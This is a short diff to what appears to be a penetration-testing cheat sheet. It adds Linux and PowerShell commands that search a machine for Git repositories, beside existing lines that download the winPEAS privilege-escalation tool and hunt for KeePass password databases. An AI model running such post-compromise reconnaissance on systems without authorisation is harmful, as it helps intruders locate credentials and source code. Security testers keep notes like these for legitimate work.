@@ -85,6 +85,11 @@ eg.
 ps | grep firefox
 ```
 
+Find Git repos on Linux:
+```bash
+find / -name ".git" 2>/dev/null
+```
+
 Powershell or CMD:
 ```powershell
 (dir 2>&1 *`|echo CMD);&<# rem #>echo Powershell
@@ -121,8 +126,13 @@ iwr -uri http://my.url/winPEASx64.exe -Outfile winPEAS.exe
 ```
 
 Powershell find Keepass file:
-```bash
+```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Find Git repository on Windows:
+```powershell
+Get-ChildItem -Path C:\ -Include '.git' -Directory -Recurse -ErrorAction SilentlyContinue -Force
 ```
 
 Powershell find string in files:
